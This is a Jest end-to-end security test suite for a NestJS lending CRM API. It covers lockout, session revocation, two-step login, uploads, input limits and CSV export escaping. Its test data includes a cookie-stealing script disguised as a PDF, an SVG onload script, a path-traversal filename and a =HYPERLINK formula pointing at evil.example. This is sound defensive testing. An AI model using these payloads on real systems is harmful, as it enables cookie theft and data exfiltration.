/* eslint-disable @typescript-eslint/no-explicit-any */
import { INestApplication } from "@nestjs/common";
import request from "supertest";
import { createTestApp } from "./app";
import { totpAt } from "../src/auth/totp";
import { PrismaService } from "../src/prisma/prisma.service";

const API = "/crm/api";
const PDF = Buffer.concat([Buffer.from("%PDF-1.7\n%âãÏÓ\n1 0 obj\n<<>>\nendobj\n"), Buffer.alloc(64)]);

/** Account lockout, session revocation, hardened two-step login, upload checks, input limits and export safety. */
describe("security hardening", () => {
  let app: INestApplication;
  let http: ReturnType<typeof request>;
  let prisma: PrismaService;
  let admin: string;

  const as = (t?: string) => (t ? { Authorization: `Bearer ${t}` } : {});
  const get = (path: string, t?: string) => http.get(`${API}${path}`).set(as(t));
  const post = (path: string, t: string | undefined, body: object = {}) => http.post(`${API}${path}`).set(as(t)).send(body);
  const patch = (path: string, t: string, body: object) => http.patch(`${API}${path}`).set(as(t)).send(body);
  const login = (email: string, password: string) => post("/auth/login", undefined, { email, password });

  // A code is good for one 30-second step, so tests move the clock on a step rather than wait.
  const realNow = Date.now.bind(Date);
  let steps = 0;
  const nextCode = (secret: string) => {
    steps += 1;
    return totpAt(secret, Date.now() / 1000);
  };

  /** A staff account that has chosen its own password (and optionally has two-step login on). */
  async function makeUser(name: string, role: "ADVISOR" | "MANAGER" = "ADVISOR", twoStep = false) {
    const email = `${name}@example.com`;
    const issued = "IssuedPass#12345";
    const password = "OwnPassword#12345";
    const id = (await post("/team", admin, { name, email, role, password: issued })).body.id as string;
    const first = (await login(email, issued)).body.accessToken;
    const changed = await post("/auth/change-password", first, { currentPassword: issued, newPassword: password });
    let token = changed.body.accessToken as string;
    let secret = "";
    if (twoStep) {
      secret = (await post("/auth/2fa/setup", token)).body.secret;
      await post("/auth/2fa/enable", token, { code: nextCode(secret) });
      token = "";
    }
    return { id, email, password, token, secret };
  }

  beforeAll(async () => {
    jest.spyOn(Date, "now").mockImplementation(() => realNow() + steps * 30_000);
    app = await createTestApp();
    http = request(app.getHttpServer()) as never;
    prisma = app.get(PrismaService);
    admin = (await login("admin@growthcapitalservices.in", "ChangeMe123!")).body.accessToken;
  });

  afterAll(async () => {
    jest.restoreAllMocks();
    await app?.close();
  });

  describe("guessing is capped per account, from any address", () => {
    it("locks after five wrong passwords — and then refuses even the right one", async () => {
      const u = await makeUser("lock.target");
      for (let i = 0; i < 5; i++) expect((await login(u.email, "WrongPassword#1")).status).toBe(401);
      const locked = await login(u.email, u.password);
      expect(locked.status).toBe(429);
      expect(locked.body.message).toMatch(/Too many attempts/);
    });

    it("leaves other accounts alone, and a success resets the count", async () => {
      const a = await makeUser("lock.a");
      const b = await makeUser("lock.b");
      for (let i = 0; i < 4; i++) await login(a.email, "WrongPassword#1");
      expect((await login(a.email, a.password)).status).toBe(201); // fifth try is right → counter cleared
      for (let i = 0; i < 4; i++) await login(a.email, "WrongPassword#1");
      expect((await login(a.email, a.password)).status).toBe(201);
      expect((await login(b.email, b.password)).status).toBe(201);
    });

    it("treats an unknown email exactly like a real one, so nothing is revealed", async () => {
      const email = "nobody.here@example.com";
      for (let i = 0; i < 5; i++) expect((await login(email, "WrongPassword#1")).status).toBe(401);
      expect((await login(email, "WrongPassword#1")).status).toBe(429);
    });

    it("lifts by itself once the time is up", async () => {
      const u = await makeUser("lock.expiry");
      for (let i = 0; i < 5; i++) await login(u.email, "WrongPassword#1");
      expect((await login(u.email, u.password)).status).toBe(429);
      await prisma.loginLock.update({ where: { subject: `staff:${u.email}` }, data: { lockedUntil: new Date(Date.now() - 1000) } });
      expect((await login(u.email, u.password)).status).toBe(201);
    });

    it("a Super Admin's password reset also lets a locked person back in", async () => {
      const u = await makeUser("lock.reset");
      for (let i = 0; i < 5; i++) await login(u.email, "WrongPassword#1");
      expect((await login(u.email, u.password)).status).toBe(429);
      await post(`/team/${u.id}/reset-password`, admin, { password: "ResetByAdmin#123" });
      expect((await login(u.email, "ResetByAdmin#123")).status).toBe(201);
    });

    it("applies to a stolen session guessing the current password, and to partners and borrowers", async () => {
      const u = await makeUser("lock.session");
      for (let i = 0; i < 5; i++) {
        expect((await post("/auth/change-password", u.token, { currentPassword: "WrongPassword#1", newPassword: "AnotherPass#12345" })).status).toBe(400);
      }
      expect((await post("/auth/change-password", u.token, { currentPassword: u.password, newPassword: "AnotherPass#12345" })).status).toBe(429);

      await post("/partners", admin, { name: "Lock Partner", phone: "9000012001", commissionRate: 20, password: "PartnerPass#1234" });
      for (let i = 0; i < 5; i++) expect((await post("/partner/auth/login", undefined, { phone: "9000012001", password: "WrongPass#12345" })).status).toBe(401);
      expect((await post("/partner/auth/login", undefined, { phone: "9000012001", password: "PartnerPass#1234" })).status).toBe(429);

      for (let i = 0; i < 5; i++) expect((await post("/borrower/auth/login", undefined, { phone: "9000012002", accessCode: "WRONGCODE" })).status).toBe(401);
      expect((await post("/borrower/auth/login", undefined, { phone: "9000012002", accessCode: "WRONGCODE" })).status).toBe(429);
    });
  });

  describe("old sessions stop working when the credentials change", () => {
    it("changing your password retires every other session but not the one you are in", async () => {
      const u = await makeUser("revoke.change");
      const stolen = (await login(u.email, u.password)).body.accessToken;
      expect((await get("/auth/me", stolen)).status).toBe(200);

      const done = await post("/auth/change-password", u.token, { currentPassword: u.password, newPassword: "BrandNew#Pass123" });
      expect((await get("/auth/me", stolen)).status).toBe(401);
      expect((await get("/auth/me", u.token)).status).toBe(401);
      expect((await get("/auth/me", done.body.accessToken)).status).toBe(200);
    });

    it("an admin reset signs the person out everywhere", async () => {
      const u = await makeUser("revoke.reset");
      expect((await get("/auth/me", u.token)).status).toBe(200);
      await post(`/team/${u.id}/reset-password`, admin, { password: "ResetByAdmin#123" });
      expect((await get("/auth/me", u.token)).status).toBe(401);
    });

    it("resetting or turning off two-step login does too", async () => {
      const u = await makeUser("revoke.2fa", "ADVISOR", true);
      const s = await post("/auth/login", undefined, { email: u.email, password: u.password });
      const session = await post("/auth/2fa/verify", undefined, { challengeToken: s.body.challengeToken, code: nextCode(u.secret) });
      const token = session.body.accessToken;
      expect((await get("/auth/me", token)).status).toBe(200);
      await post(`/team/${u.id}/reset-2fa`, admin);
      expect((await get("/auth/me", token)).status).toBe(401);

      // Turning it off yourself hands back a fresh token for the session you are in.
      const again = await login(u.email, u.password);
      const secret = (await post("/auth/2fa/setup", again.body.accessToken)).body.secret;
      await post("/auth/2fa/enable", again.body.accessToken, { code: nextCode(secret) });
      const challenge = (await login(u.email, u.password)).body.challengeToken;
      const signedIn = (await post("/auth/2fa/verify", undefined, { challengeToken: challenge, code: nextCode(secret) })).body.accessToken;
      const off = await post("/auth/2fa/disable", signedIn, { password: u.password, code: nextCode(secret) });
      expect(off.status).toBe(201);
      expect((await get("/auth/me", signedIn)).status).toBe(401);
      expect((await get("/auth/me", off.body.accessToken)).status).toBe(200);
    });

    it("a partner's password being set, or a borrower's code being regenerated, ends their open sessions", async () => {
      const partner = await post("/partners", admin, { name: "Revoke Partner", phone: "9000013001", commissionRate: 20, password: "PartnerPass#1234" });
      const pToken = (await post("/partner/auth/login", undefined, { phone: "9000013001", password: "PartnerPass#1234" })).body.accessToken;
      expect((await get("/partner/me", pToken)).status).toBe(200);
      await post(`/partners/${partner.body.id}/set-password`, admin, { password: "NewPartnerPass#123" });
      expect((await get("/partner/me", pToken)).status).toBe(401);
      expect((await post("/partner/auth/login", undefined, { phone: "9000013001", password: "NewPartnerPass#123" })).status).toBe(201);

      const products = (await get("/loan-products", admin)).body as { id: string }[];
      const application = (await post("/applications", admin, {
        loanProductId: products[0].id,
        requestedAmount: 500000,
        applicants: [{ name: "Revoke Borrower", phone: "9000013002", isPrimary: true }],
      })).body;
      const code = (await get(`/applications/${application.id}`, admin)).body.portalAccessCode;
      const bToken = (await post("/borrower/auth/login", undefined, { phone: "9000013002", accessCode: code })).body.accessToken;
      expect((await get("/borrower/me", bToken)).status).toBe(200);
      const fresh = (await post(`/applications/${application.id}/portal-access-code`, admin)).body.portalAccessCode;
      expect((await get("/borrower/me", bToken)).status).toBe(401);
      expect((await post("/borrower/auth/login", undefined, { phone: "9000013002", accessCode: code })).status).toBe(401);
      expect((await post("/borrower/auth/login", undefined, { phone: "9000013002", accessCode: fresh })).status).toBe(201);
    });
  });

  describe("two-step login cannot be replayed or ground down", () => {
    it("a challenge works once: after success it is spent, and a newer password sign-in replaces it", async () => {
      const u = await makeUser("tfa.single", "MANAGER", true);
      const first = (await login(u.email, u.password)).body.challengeToken;
      const second = (await login(u.email, u.password)).body.challengeToken;
      // The first was replaced when the second sign-in started.
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: first, code: nextCode(u.secret) })).status).toBe(401);
      const ok = await post("/auth/2fa/verify", undefined, { challengeToken: second, code: nextCode(u.secret) });
      expect(ok.status).toBe(201);
      // Spent: the same challenge with another valid code gets nothing.
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: second, code: nextCode(u.secret) })).status).toBe(401);
    });

    it("a code that has signed someone in cannot sign anyone in again", async () => {
      const u = await makeUser("tfa.replay", "MANAGER", true);
      const code = nextCode(u.secret);
      const one = (await login(u.email, u.password)).body.challengeToken;
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: one, code })).status).toBe(201);
      const two = (await login(u.email, u.password)).body.challengeToken;
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: two, code })).status).toBe(401);
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: two, code: nextCode(u.secret) })).status).toBe(201);
    });

    it("five wrong codes lock the code step, and a fresh password sign-in does not get round it", async () => {
      const u = await makeUser("tfa.grind", "MANAGER", true);
      const challenge = (await login(u.email, u.password)).body.challengeToken;
      for (let i = 0; i < 5; i++) expect((await post("/auth/2fa/verify", undefined, { challengeToken: challenge, code: "000000" })).status).toBe(401);
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: challenge, code: nextCode(u.secret) })).status).toBe(429);
      const another = (await login(u.email, u.password)).body.challengeToken;
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: another, code: nextCode(u.secret) })).status).toBe(429);
      // A Super Admin resetting the account clears it.
      await post(`/team/${u.id}/reset-2fa`, admin);
      expect((await login(u.email, u.password)).body.accessToken).toBeTruthy();
    });

    it("the secret is encrypted in the database, and an older plain one is upgraded when first used", async () => {
      const u = await makeUser("tfa.at-rest", "MANAGER", true);
      const stored = (await prisma.user.findUniqueOrThrow({ where: { id: u.id } })).totpSecret!;
      expect(stored.startsWith("enc1:")).toBe(true);
      expect(stored).not.toContain(u.secret);

      await prisma.user.update({ where: { id: u.id }, data: { totpSecret: u.secret } }); // as saved before encryption existed
      const challenge = (await login(u.email, u.password)).body.challengeToken;
      expect((await post("/auth/2fa/verify", undefined, { challengeToken: challenge, code: nextCode(u.secret) })).status).toBe(201);
      expect((await prisma.user.findUniqueOrThrow({ where: { id: u.id } })).totpSecret!.startsWith("enc1:")).toBe(true);
    });
  });

  describe("uploads are judged by what they are", () => {
    let applicationId: string;
    const upload = (buf: Buffer, filename: string, contentType: string) =>
      http.post(`${API}/applications/${applicationId}/documents`).set(as(admin)).field("category", "KYC").attach("file", buf, { filename, contentType });

    beforeAll(async () => {
      const products = (await get("/loan-products", admin)).body as { id: string }[];
      applicationId = (await post("/applications", admin, {
        loanProductId: products[0].id,
        requestedAmount: 700000,
        applicants: [{ name: "Upload Person", phone: "9000014001", isPrimary: true }],
      })).body.id;
    });

    it.each([
      ["a web page named like a PDF", Buffer.from("<html><script>alert(document.cookie)</script></html>"), "pan.pdf", "application/pdf"],
      ["an SVG with a script", Buffer.from("<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"), "photo.png", "image/png"],
      ["a program", Buffer.concat([Buffer.from("MZ"), Buffer.alloc(64)]), "statement.pdf", "application/pdf"],
    ])("rejects %s even when the name and type claim otherwise", async (_label, buf, filename, contentType) => {
      const res = await upload(buf, filename, contentType);
      expect(res.status).toBe(400);
      expect(res.body.message).toMatch(/Only PDF, JPG, PNG, WebP or HEIC/);
    });

    it("accepts a real PDF, names it from its contents, cleans the name, and serves it as a download", async () => {
      const res = await upload(PDF, '../../evil"name\r\n.html', "text/html");
      expect(res.status).toBe(201);
      expect(res.body.mimeType).toBe("application/pdf");
      expect(res.body.objectKey).toMatch(/\.pdf$/);
      expect(res.body.fileName).not.toMatch(/[/\\"\r\n]/);

      const link = (await get(`/applications/${applicationId}/documents/${res.body.id}/download`, admin)).body.url as string;
      expect(decodeURIComponent(link)).toMatch(/attachment/);
      expect(link).toMatch(/response-content-type=application%2Fpdf/);

      expect((await http.delete(`${API}/applications/${applicationId}/documents/${res.body.id}`).set(as(admin))).status).toBe(200);
    });
  });

  describe("every field has a ceiling", () => {
    it("refuses oversized text, absurd amounts and runaway search text", async () => {
      const lead = (await post("/leads", admin, { name: "Ceiling Person", phone: "9000015001", source: "e2e" })).body.id;
      expect((await patch(`/leads/${lead}`, admin, { email: "x".repeat(6000) })).status).toBe(400);
      expect((await patch(`/leads/${lead}`, admin, { amount: 1e30 })).status).toBe(400);
      expect((await get(`/leads?search=${"x".repeat(6000)}`, admin)).status).toBe(400);
      expect((await patch(`/leads/${lead}`, admin, { amount: 2_500_000 })).status).toBe(200);
    });
  });

  describe("exports cannot carry a spreadsheet formula", () => {
    it("a malicious name from the public form arrives in the CSV as plain text", async () => {
      const evil = '=HYPERLINK("http://evil.example/steal","Click to verify")';
      expect((await post("/public/leads", undefined, { name: evil, phone: "9000016001", source: "website" })).status).toBe(201);

      const res = await get("/reports/records/export?type=leads&format=csv", admin);
      expect(res.status).toBe(200);
      const csv = res.text;
      expect(csv).toContain(`'=HYPERLINK(`);
      // No cell may begin with the raw formula.
      expect(csv).not.toMatch(/(^|,|\r\n)"?=HYPERLINK/);
    });
  });

  describe("the API sends strict browser headers", () => {
    it("locks down content, framing and sniffing", async () => {
      const res = await http.get(`${API}/health`);
      expect(res.headers["content-security-policy"]).toMatch(/default-src 'none'/);
      expect(res.headers["x-content-type-options"]).toBe("nosniff");
      expect(res.headers["x-powered-by"]).toBeUndefined();
      expect(res.headers["referrer-policy"]).toBe("no-referrer");
    });
  });
});
